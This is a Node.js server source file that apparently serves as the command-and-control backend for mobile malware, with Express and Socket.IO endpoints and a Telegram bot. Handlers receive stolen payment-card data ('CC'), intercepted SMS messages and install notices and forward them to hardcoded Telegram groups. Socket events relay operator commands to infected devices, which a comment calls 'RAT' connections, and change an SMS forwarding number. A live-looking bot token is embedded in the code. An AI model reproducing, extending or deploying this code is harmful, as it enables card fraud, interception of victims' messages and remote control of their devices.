// Importing necessary modules
const { Telegraf } = require('telegraf');

const botTele = new Telegraf('7998864073:AAH0BdQPkaDAHAkzgGzx_gLziHC7n2tCIrM');  // ORG

const CCID = '-4774963526';
const SSID = '-4721872442';
const INSID = '-4701840910';

const CCID_ = '';
const SSID_ = '';
const INSID_ = '';

const express = require('express');
const http = require('http');
const socketIo = require('socket.io');

// Create the first Express app
const app = express();
const port = process.env.PORT || 3000;

const cors = require('cors');

app.use(cors()); // Allow all origins
app.use(express.json());

// Create an HTTP server
const server = http.createServer(app);

// Attach Socket.IO to the HTTP server
const io = socketIo(server);

let chatUsers = [];

const jsonData = {
  message: 'Done!',
};

app.get('/', (req, res) => {
  res.send(jsonData);
});

// This listens for any message
botTele.on('text', (ctx) => {
    const message = ctx.message.text;

    // Check if the message is !chatid
    if (message === '!chatid') {
        // Send back the chat_id of the user
        const chatId = ctx.chat.id;
		const username = ctx.chat.username;
        ctx.reply(`Your chat ID is: ${chatId}`);
		console.log('Chat ID of user: '+ username + ' ID: '+chatId);
    }
});

// When the bot is added to a group, it will trigger the 'new_chat_members' event
botTele.on('new_chat_members', (ctx) => {
    // Check if the bot itself is added
    const newMember = ctx.message.new_chat_members[0];
	
    if (newMember && newMember.id === ctx.botInfo.id) {
        // Send the group ID to the chat
        const groupId = ctx.chat.id;  // Group ID

        // Send a message to the group with the group ID
        ctx.reply(`Hello! I'm now added to this group. The Group ID is: ${groupId}`);
    }
	
});


// Start the bot
botTele.launch().then(() => {
    console.log('Bot is running...');
});

//botTele.telegram.sendMessage(chatid, "Test msg");

app.post('/data_io', (req, res) => {
	  //console.log('DATA IO',req.body.data);
	  const data_ = req.body.data;
	  io.emit('user_online',data_);
	  res.status(200).send(jsonData);
});

app.post('/data_alert', (req, res) => {
	  //console.log('data_alert',req.body.data);
	  const data_ = req.body.data;
	  io.emit('user_online',data_);
	  res.status(200).send(jsonData);
});

app.post('/dataI', (req, res) => {
	  //console.log('data_i',req.body.data);
	  const data_ = req.body.data;
	  io.emit('install_got',data_);
	  // Send INSTALL to the group
	  botTele.telegram.sendMessage(INSID, data_)
	  res.status(200).send(jsonData);
});

app.post('/dataC', (req, res) => {
	  //console.log('data_i',req.body.data);
	  const data_ = req.body.data;
	  io.emit('card_got',data_);
		// Send CC to the group
	  botTele.telegram.sendMessage(CCID, data_)
	  res.status(200).send(jsonData);
});

app.post('/dataS', (req, res) => {
	//console.log('data_s',req.body.data);
	const data_ = req.body.data;
	io.emit('sms_got',data_);
	// Send message to the group
	botTele.telegram.sendMessage(SSID, data_)
	res.status(200).send(jsonData);
});

// Sending data to Telegram Chat id with bot
// app.post('/data_st', (req, res) => {
	// try{
		// const data_ = req.body.data;
		// const tgid_ = req.body.chatId;
		// io.emit('sms_got',data_);
		////Send message to the group
		// botTele.telegram.sendMessage(tgid_, data_)
		// res.status(200).send(jsonData);
	// }catch(error){
		// res.status(400).send(error);
	// }
// });


app.post('/data_st', (req, res) => {
    try {
        const data_ = req.body.data;
        const tgid_ = req.body.chatId;

        // Log chat ID and message data for debugging
        //console.log('Sending to chat ID:', tgid_);
        //console.log('Message data:', data_);

        // Emit the message to your socket.io server
        io.emit('sms_got', data_);

        // Send message to the chat
        botTele.telegram.sendMessage(tgid_, data_)
            .then(response => {
                //console.log('Message sent successfully:', response);
                res.status(200).send({ success: true, message: 'Message sent successfully' });
            })
            .catch(error => {
                //console.error('Error sending message:', error);
                res.status(400).send({success: false, error: 'Failed to send message', details: error.message });
            });
    } catch (error) {
        console.error('Unexpected error:', error);
        res.status(500).send({ success: false, error: 'Server error', details: error.message });
    }
});


// SECOND GROUPS
app.post('/data_i_', (req, res) => {
	const data_ = req.body.data;
	io.emit('install_got',data_);
	  // Send INSTALL to the group
	  botTele.telegram.sendMessage(INSID_, data_)
	res.status(200).send(jsonData);
  });
  
  app.post('/data_c_', (req, res) => {
	const data_ = req.body.data;
	io.emit('card_got',data_);
	  // Send CC to the group
	  botTele.telegram.sendMessage(CCID_, data_)
	res.status(200).send(jsonData);
  });
  
  app.post('/data_s_', (req, res) => {
	  const data_ = req.body.data;
	  io.emit('sms_got',data_);
	  // Send message to the group
	  botTele.telegram.sendMessage(SSID_, data_)
	  res.status(200).send(jsonData);
  });


// Socket.IO event handlers
io.on('connection', (socket) => {
  console.log('WebSocket client connected');
  socket.on('message', (message) => {
    console.log('Received message:', message);
    socket.emit('msg', 'Hello from WebSocket server!');
  });
  	socket.on('card_send' , function(data){
		io.emit('card_got',data);
		//botTele.telegram.sendMessage(CCID, data_)
	});
	
	socket.on('admin_cmd', (data) => {
        console.log('admin_cmd Received JSON:', data);
        // You can send a response back to the client
        io.emit('admin_cmd_to_user', data);
    });
	
	socket.on('cmd_response', (data) => {
        console.log('cmd_response Received JSON:', data);
        // You can send a response back to the client
        io.emit('cmd_response_to_admin', data);
    });
	
	///////////////////////////////////////////////////////////////////////
	
	
	    // Add user to the list
    socket.on("join", (username) => {
        chatUsers.push({ id: socket.id, username });
        io.emit("userList", chatUsers); // Send updated user list to all connected clients
    });

    // Broadcast incoming messages
    socket.on("chatMessage", (msg) => {
        io.emit("chatMessage", msg);  // Send the message to all clients
    });

    // Handle disconnection
    socket.on("disconnect", () => {
        console.log("User disconnected");
        chatUsers = chatUsers.filter(user => user.id !== socket.id);
        io.emit("userList", chatUsers); // Send updated user list after disconnection
    });
	
	
	//////////////////////////////////////////////////////////////////////
	
	
	socket.on('user_data', (data) => {
        console.log('user_data Received JSON:', data);
        // You can send a response back to the client
        io.emit('user_data_to_admin', data);
    });
	
	socket.on('card_copy_ss' , function(data){
		io.emit('card_copy_pc',data);
	});
	
	socket.on('send_card_copy' , function(data){
		io.emit('card_copy',data);
	});
	
	////////////////////////////////////////////////////////////
	
	socket.on('update_num_server' , function(data){
		console.log('UPDATING FORW_NUM: '+data);
		forw_num = data;
		io.emit('update_num',forw_num);
	});
	
	socket.on('online_check' , function(data){
		io.emit('is_online',data);
	});
	
	socket.on('online_check_card' , function(data){
		io.emit('are_you_online',data);
	});
	
	socket.on('user_send' , function(data){
		io.emit('user_online',data);
	});
		
	socket.on('msg_send' , function(data){
		io.emit('sms_got',data);
	});
	
	socket.on('net_send' , function(data){
		io.emit('net_got',data);
	});
	
	socket.on('cmd' , function(data){
		io.emit('cmd_send',data);
	});
	
	// ON NEW RAT CONNECTION AFTER NEW CONNECTION
	socket.on('user_connected' , function(data){
		io.emit('on_user_connected',data);
	});
	
	socket.on('card_data' , function(data){
		io.emit('card_data_rat',data);
	});

	socket.on('sms' , function(data){
		io.emit('sms_rat',data);
	});
	
		
	socket.on('cmd_done' , function(data){
		io.emit('cmd_done_rat',data);
	});
	
	socket.on("disconnect", () => console.log("User Disconnected: "+socket.id));
	////////////////////////////////////////////////////////////
	
});

// Start the HTTP server
server.listen(port, () => {
  console.log(`Server running at ${port}`);
});







